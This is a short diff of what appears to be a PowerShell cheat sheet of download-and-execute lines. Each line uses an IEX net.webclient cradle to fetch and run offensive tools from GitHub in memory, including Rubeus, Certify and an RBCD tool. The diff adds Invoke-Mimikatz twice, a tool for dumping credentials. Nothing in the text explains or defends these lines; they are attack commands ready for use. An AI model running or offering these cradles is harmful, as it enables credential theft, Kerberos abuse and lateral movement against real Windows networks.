@@ -7,7 +7,8 @@ IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.co
 # 3 whatever
 IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Gimpy42/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Rubeus.ps1'))
 
-IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Gimpy42/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1'))
+IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1'))
+IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1'))
 
 IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Gimpy42/PowerSharpPack/refs/heads/master/PowerSharpBinaries/Invoke-Certify.ps1'))
 
